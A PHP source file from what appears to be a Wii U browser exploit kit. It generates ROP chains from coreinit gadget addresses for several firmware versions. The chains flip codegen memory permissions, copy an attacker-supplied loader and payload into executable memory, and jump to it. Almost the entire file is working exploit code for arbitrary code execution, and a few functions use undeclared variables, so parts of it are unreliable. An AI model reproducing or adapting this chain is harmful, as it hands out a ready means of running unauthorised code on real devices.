<?php

require_once("wiiuhaxx_common_cfg.php");

if(!isset($wiiuhaxxcfg_payloadfilepath) || !isset($wiiuhaxxcfg_loaderfilepath))die("The filepaths for wiiuhaxxcfg are not set in the cfg file.");

if(!isset($sysver))$sysver = -1;

if(isset($_REQUEST['sysver']))
{
	if($_REQUEST['sysver']==="532")
	{
		$sysver = 532;
	}
	else if($_REQUEST['sysver']==="540")
	{
		$sysver = 540;
	}
	else if($_REQUEST['sysver']==="550")
	{
		$sysver = 550;
		$wiiuhaxxcfg_payloadfilepath = "code550.bin";
	}
}

if($sysver===-1)die("The system-version must be specified via an URL parameter.");

$filesysver = $sysver;
if($filesysver == 540)$filesysver = 532;

require_once("wiiuhaxx_rop_sysver_$filesysver.php");

if(!isset($ropchainselect))$ropchainselect = -1;
if($ropchainselect == -1)
{
	$ropchainselect = 1;
}

if(!isset($generatebinrop))$generatebinrop = 0;

/*
Documentation for the addrs loaded from the above:

$ROP_POPJUMPLR_STACK12 Load LR from stackreg+12, add stackreg with 8, then jump to LR.
$ROP_POPJUMPLR_STACK20 Add stackreg with 16, load LR from stackreg+4 then jump to LR.
$ROP_CALLFUNC Call the code with the address stored in r27, with: r3=r29, r4=r31, r5=r25, r6=r24, r7=r28. Then once it returns from that code: r3=r29. Load r20..r31 from the data starting at stackreg+8. Load LR from stackreg+60, add stackreg with 56, then jump to LR.
$ROP_CALLR28_POP_R28_TO_R31 Set r4 to r31, then call the code with the address stored in r28. Load r28..r31 from the data starting at stackreg+8. Load LR from stackreg+28. Add stackreg with 24, then jump to LR.
$ROP_POP_R28R29R30R31 Load r28..r31 from the data starting at stackreg+8. Load LR from stackreg+28, add stackreg with 24, then jump to LR.
$ROP_POP_R27 Load r27 from stackreg+12. Load LR from stackreg+36, add stackreg with 32, then jump to LR.
$ROP_POP_R24_TO_R31 Load r24..r31 with the data starting at stackreg+16. Load LR from stackreg+52. Add stackreg with 48, then jump to LR.
$ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM r12=r3. r9 = *r12, this value must be non-zero otherwise a branch to elsewhere is executed. r5 = *(r12+36), r3 = *(r12+28), r4 = *(r12+32), r6 = *(r12+4). Then it calls the address stored in r9.
$ROP_SETR3TOR31_POP_R31 r3=r31. Load LR from stackreg+20, load r31 from stackreg+12, add stackreg with 16 then jump to LR.

$ROP_memcpy Address of "memcpy" in coreinit.
$ROP_DCFlushRange Address of "DCFlushRange" in coreinit. void DCFlushRange(const void *addr, size_t length);
$ROP_ICInvalidateRange Address of "ICInvalidateRange" in coreinit. void ICInvalidateRange(const void *addr, size_t length);
$ROP_OSSwitchSecCodeGenMode Address of "OSSwitchSecCodeGenMode" in coreinit. OSSwitchSecCodeGenMode(bool flag)
$ROP_OSCodegenCopy Address of "OSCodegenCopy" in coreinit. u32 OSCodegenCopy(dstaddr, srcaddr, size)
$ROP_OSGetCodegenVirtAddrRange Address of "OSGetCodegenVirtAddrRange" in coreinit. void OSGetCodegenVirtAddrRange(u32 *out0, u32 *out1)
$ROP_OSGetCoreId Address of "OSGetCoreId" in coreinit.
$ROP_OSGetCurrentThread Address of "OSGetCurrentThread" in coreinit. OSThread *OSGetCurrentThread(void)
$ROP_OSSetThreadAffinity Address of "OSSetThreadAffinity" in coreinit. OSSetThreadAffinity(OSThread* thread, u32 affinity)
$ROP_OSYieldThread Address of "OSYieldThread" in coreinit. OSYieldThread(void)
$ROP_OSFatal Address of "OSFatal" in coreinit.
$ROP_Exit Address of "_Exit" in coreinit.
$ROP_OSScreenFlipBuffersEx Address of "OSScreenFlipBuffersEx" in coreinit.
$ROP_OSScreenClearBufferEx Address of "OSScreenClearBufferEx" in coreinit.
$ROP_OSDynLoad_Acquire Address of "OSDynLoad_Acquire" in coreinit.
$ROP_OSDynLoad_FindExport Address of "OSDynLoad_FindExport" in coreinit.
$ROP_os_snprintf Address of "__os_snprintf" in coreinit.
*/

function genu32_unicode($value)//This would need updated to support big-endian.
{
	$hexstr = sprintf("%08x", $value);
	$outstr = "\u" . substr($hexstr, 4, 4) . "\u" . substr($hexstr, 0, 4);
	return $outstr;
}
function genu32_unicode_jswrap($value)
{
	$str = "\"" . genu32_unicode($value) . "\"";
	return $str;
}
function ropchain_appendu32($val)
{
	global $ROPCHAIN, $generatebinrop;
	if($generatebinrop==0)
	{
		$ROPCHAIN.= genu32_unicode($val);
	}
	else
	{
		$ROPCHAIN.= pack("N*", $val);
	}
}

function generate_ropchain()
{
	global $ROPCHAIN, $generatebinrop, $ropchainselect;

	$ROPCHAIN = "";

	if($generatebinrop==0)$ROPCHAIN .= "\"";

	if($ropchainselect==1)
	{
		generateropchain_type1();
	}

	if($generatebinrop==0)$ROPCHAIN.= "\"";
}

function wiiuhaxx_generatepayload()
{
	global $wiiuhaxxcfg_payloadfilepath, $wiiuhaxxcfg_loaderfilepath;

	$actual_payload = file_get_contents($wiiuhaxxcfg_payloadfilepath);
	if($actual_payload === FALSE || strlen($actual_payload) < 4)return FALSE;

	$loader = file_get_contents($wiiuhaxxcfg_loaderfilepath);
	if($loader === FALSE || strlen($loader) < 4)return FALSE;
	$len = strlen($actual_payload);

	while($len & 0x3)//The actual payload size must be 4-byte aligned.
	{
		$actual_payload.= pack("C*", 0x00);
		$len = strlen($actual_payload);
	}

	$loader .= pack("N*", $len);

	return $loader . $actual_payload;
}

function ropgen_pop_r24_to_r31($inputregs)
{
	global $ROP_POP_R24_TO_R31;

	ropchain_appendu32($ROP_POP_R24_TO_R31);
	ropchain_appendu32(0x0);
	ropchain_appendu32(0x0);
	for($i=0; $i<(32-24); $i++)ropchain_appendu32($inputregs[$i]);
	ropchain_appendu32(0x0);
}

function ropgen_setr3_popr20_to_r31($inputregs)//r3 = r29, then pop r20..r31.
{
	ropchain_appendu32($ROP_CALLFUNC + 0x1c);

	for($i=0; $i<(32-20); $i++)ropchain_appendu32($inputregs[$i]);
	ropchain_appendu32(0x0);
}

function ropgen_callfunc($funcaddr, $r3, $r4, $r5, $r6, $r28)
{
	global $ROP_CALLR28_POP_R28_TO_R31, $ROP_CALLFUNC;

	$inputregs = array();
	$inputregs[24 - 24] = $r6;//r24 / r6
	$inputregs[25 - 24] = $r5;//r25 / r5
	$inputregs[26 - 24] = 0x0;//r26
	$inputregs[27 - 24] = $ROP_CALLR28_POP_R28_TO_R31;//r27
	$inputregs[28 - 24] = $funcaddr;//r28 / r7
	$inputregs[29 - 24] = $r3;//r29 / r3
	$inputregs[30 - 24] = 0x0;//r30
	$inputregs[31 - 24] = $r4;//r31 / r4

	ropgen_pop_r24_to_r31($inputregs);

	ropchain_appendu32($ROP_CALLFUNC);

	ropchain_appendu32($r28);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);
}

function ropgen_callgadget_singleparam($funcaddr, $r3)
{
	ropgen_setr3($r3);

	ropchain_appendu32($funcaddr);
}

function ropgen_setr3($r3)
{
	global $ROP_POP_R28R29R30R31, $ROP_SETR3TOR31_POP_R31;

	ropchain_appendu32($ROP_POP_R28R29R30R31);

	ropchain_appendu32(0x0);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32($r3);//r31
	ropchain_appendu32(0x0);

	ropchain_appendu32($ROP_SETR3TOR31_POP_R31);//Setup r3.

	ropchain_appendu32(0x0);
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);
}

function ropgen_write_r3r4_tomem($outaddr)//r3 is written to $outaddr, then $ROPHEAP is written to $ROPHEAP.
{
	global $ROP_POP_R28R29R30R31, $ROP_CALLR28_POP_R28_TO_R31, $ROP_OSGetCodegenVirtAddrRange, $ROPHEAP;

	ropchain_appendu32($ROP_POP_R28R29R30R31);

	ropchain_appendu32($ROP_OSGetCodegenVirtAddrRange + 0x20);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32($outaddr);//r30
	ropchain_appendu32($ROPHEAP);//r31
	ropchain_appendu32(0x0);

	ropchain_appendu32($ROP_CALLR28_POP_R28_TO_R31);

	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);
}

function ropgen_writeword_tomem($value, $addr)
{
	ropgen_setr3($value);

	ropgen_write_r3r4_tomem($addr);
}

function ropgen_OSFatal($stringaddr)
{
	global $ROP_OSFatal;

	ropgen_callgadget_singleparam($ROP_OSFatal, $stringaddr);
}

function ropgen_Exit()
{
	global $ROP_Exit;

	ropchain_appendu32($ROP_Exit);
}

function ropgen_OSGetCoreId()
{
	global $ROP_OSGetCoreId;

	ropgen_callfunc($ROP_OSGetCoreId, 0x0, 0x0, 0x0, 0x0, 0x0);
}

function ropgen_os_snprintf($outstr_addr, $outstrsize, $formatstr_addr, $arg)
{
	global $ROP_os_snprintf;

	ropgen_callfunc($ROP_os_snprintf, $outstr_addr, $outstrsize, $formatstr_addr, $arg, 0x0);
}

function ropgen_OSScreenFlipBuffersEx($screenid)
{
	global $ROP_OSScreenFlipBuffersEx;

	ropgen_callfunc($ROP_OSScreenFlipBuffersEx, $screenid, 0x0, 0x0, 0x0, 0x0);
}

function ropgen_OSScreenClearBufferEx($screenid, $color)//Don't use any of this OSScreen stuff, this stuff just crashes since OSScreen wasn't initialized properly.
{
	global $ROP_OSScreenClearBufferEx;

	ropgen_callfunc($ROP_OSScreenClearBufferEx, $screenid, $color, 0x0, 0x0, 0x0);
}

function ropgen_colorfill($screenid, $r, $g, $b, $a)
{
	ropgen_OSScreenClearBufferEx($screenid, ($r<<24) | ($g<<16) | ($b<<8) | $a);
	ropgen_OSScreenFlipBuffersEx($screenid);
}

function ropgen_OSCodegenCopy($dstaddr, $srcaddr, $size)//This can't be used under the internetbrowser due to lack of permissions it seems.
{
	global $ROP_OSCodegenCopy;

	ropgen_callfunc($ROP_OSCodegenCopy, $dstaddr, $srcaddr, $size, 0x0, 0x0);
}

function ropgen_OSGetCodegenVirtAddrRange($outaddr0, $outaddr1)
{
	global $ROP_OSGetCodegenVirtAddrRange;

	ropgen_callfunc($ROP_OSGetCodegenVirtAddrRange, $outaddr0, $outaddr1, 0x0, 0x0, 0x0);
}

function ropgen_OSSwitchSecCodeGenMode($flag)//flag0 == RW- permissions, flag1 == R-X permissions.
{
	global $ROP_OSSwitchSecCodeGenMode;

	ropgen_callfunc($ROP_OSSwitchSecCodeGenMode, $flag, 0x0, 0x0, 0x0, 0x0);
}

function ropgen_memcpy($dst, $src, $size)
{
	global $ROP_memcpy;

	ropgen_callfunc($ROP_memcpy, $dst, $src, $size, 0x0, 0x0);
}

function ropgen_DCFlushRange($addr, $size)
{
	global $ROP_DCFlushRange;

	ropgen_callfunc($ROP_DCFlushRange, $addr, $size, 0x0, 0x0, 0x0);
}

function ropgen_ICInvalidateRange($addr, $size)
{
	global $ROP_ICInvalidateRange;

	ropgen_callfunc($ROP_ICInvalidateRange, $addr, $size, 0x0, 0x0, 0x0);
}

function ropgen_copycodebin_to_codegen($codegen_addr, $codebin_addr, $codebin_size)
{
	//global $ROPHEAP;

	//ropgen_OSCodegenCopy($codegen_addr, $codebin_addr, $codebin_size);
	//ropgen_OSGetCoreId();
	//ropgen_OSGetCodegenVirtAddrRange($ROPHEAP+0x200, $ROPHEAP+0x10+4);
	//ropgen_callfunc(0x103769C, 0x0, 0x0, 0x0, 0x0, 0x0);//5.5.0 getcodegeninfo syscall
	//ropgen_display_u32(0);

	ropgen_OSSwitchSecCodeGenMode(0);
	ropgen_memcpy($codegen_addr, $codebin_addr, $codebin_size);
	ropgen_OSSwitchSecCodeGenMode(1);

	ropgen_DCFlushRange($codegen_addr, $codebin_size);
	ropgen_ICInvalidateRange($codegen_addr, $codebin_size);
}

function ropgen_display_u32($skip_printval_initialization)//This prints the value of r3 to the screen using OSFatal + os_snprintf with formatstr "%x". When $skip_printval_initialization is non-zero, this will print the value that's already stored at $ROPHEAP+0x10+4.
{
	global $ROPHEAP, $ROP_POP_R28R29R30R31, $ROP_os_snprintf, $ROP_CALLR28_POP_R28_TO_R31, $ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM;

	$blkaddr = $ROPHEAP + 0x10;
	$outstr = $blkaddr + 0x40;
	$formatstr = $outstr + 0x40;

	if($skip_printval_initialization===0)ropgen_write_r3r4_tomem($blkaddr + 4);//Setup the r6 value.

	ropgen_writeword_tomem($ROP_POP_R28R29R30R31, $blkaddr + 0);//Setup the jump-addr.

	ropgen_writeword_tomem($outstr, $blkaddr + 28);//outstr addr
	//ropgen_writeword_tomem(0x0, $blkaddr + 32);//This doesn't matter since this r4 would get overwritten with the below anyway.
	ropgen_writeword_tomem($formatstr, $blkaddr + 36);//formatstr addr

	ropgen_writeword_tomem(0x25780000, $formatstr);//"%x"

	ropgen_callgadget_singleparam($ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM, $blkaddr);

	ropchain_appendu32($ROP_os_snprintf);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x40);//r31 / r4 (outstr maxsize)
	ropchain_appendu32(0x0);

	ropchain_appendu32($ROP_CALLR28_POP_R28_TO_R31);//snprintf(outstr, "%x", 0x40, <value of r3 at the time of ropgen_display_u32() entry>);

	ropchain_appendu32($r28);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);

	ropgen_OSFatal($outstr);
}

function ropgen_switchto_core1()
{
	global $ROP_OSGetCurrentThread, $ROP_OSSetThreadAffinity, $ROP_OSYieldThread, $ROP_CALLR28_POP_R28_TO_R31;

	ropgen_callfunc($ROP_OSGetCurrentThread, 0x0, 0x2, 0x0, 0x0, $ROP_OSSetThreadAffinity);//Set r3 to current OSThread* and setup r31 + the r28 value used by the below.

	ropchain_appendu32($ROP_CALLR28_POP_R28_TO_R31);//ROP_OSSetThreadAffinity(<output from the above call>, 0x2);

	ropchain_appendu32($ROP_OSYieldThread);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);

	ropchain_appendu32($ROP_CALLR28_POP_R28_TO_R31);

	ropchain_appendu32(0x0);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);
}

function generateropchain_type1()
{
	global $ROP_OSFatal, $ROP_Exit, $ROP_OSDynLoad_Acquire, $ROP_OSDynLoad_FindExport, $ROP_os_snprintf, $payload_srcaddr, $ROPHEAP, $ROPCHAIN;

	$payload_size = 0x20000;//Doesn't really matter if the actual payload data size in memory is smaller than this or not.
	$codegen_addr = 0x01800000;
	//$payload_srcaddr must be defined by the code including this .php.

	//ropgen_colorfill(0x1, 0xff, 0xff, 0x0, 0xff);//Color-fill the gamepad screen with yellow.

	//ropchain_appendu32(0x80808080);//Trigger a crash.

	//ropgen_OSFatal($codepayload_srcaddr);//OSFatal(<data from the haxx>);

	ropgen_switchto_core1();//When running under internetbrowser, only core1 is allowed to use codegen. Switch to core1 just in case this thread isn't on core1(with some exploit(s) it may already be one core1, but do this anyway). OSSetThreadAffinity() currently returns an error for this, hence this codebase is only usable when this ROP is already running on core1.

	ropgen_copycodebin_to_codegen($codegen_addr, $payload_srcaddr, $payload_size);

	//ropgen_colorfill(0x1, 0xff, 0xff, 0xff, 0xff);//Color-fill the gamepad screen with white.

	$regs = array();
	$regs[24 - 24] = $ROP_OSFatal;//r24
	$regs[25 - 24] = $ROP_Exit;//r25
	$regs[26 - 24] = $ROP_OSDynLoad_Acquire;//r26
	$regs[27 - 24] = $ROP_OSDynLoad_FindExport;//r27
	$regs[28 - 24] = $ROP_os_snprintf;//r28
	$regs[29 - 24] = $payload_srcaddr;//r29
	$regs[30 - 24] = 0x8;//r30 The payload can do this at entry to determine the start address of the code-loading ROP-chain: r1+= r30. r1+4 after that is where the jump-addr should be loaded from. The above r29 is a ptr to the input data used for payload loading.
	$regs[31 - 24] = $ROPHEAP;//r31

	ropgen_pop_r24_to_r31($regs);//Setup r24..r31 at the time of payload entry. Basically a "paramblk" in the form of registers, since this is the only available way to do this with the ROP-gadgets currently used by this codebase.

	ropchain_appendu32($codegen_addr);//Jump to the codegen area where the payload was written.

	//Setup the code-loading ROP-chain which can be used by the loader-payload, since the above one isn't usable after execution due to being corrupted.
	ropchain_appendu32(0x0);
	ropgen_copycodebin_to_codegen($codegen_addr, $payload_srcaddr, $payload_size);
	ropgen_pop_r24_to_r31($regs);
	ropchain_appendu32($codegen_addr);
}

?>
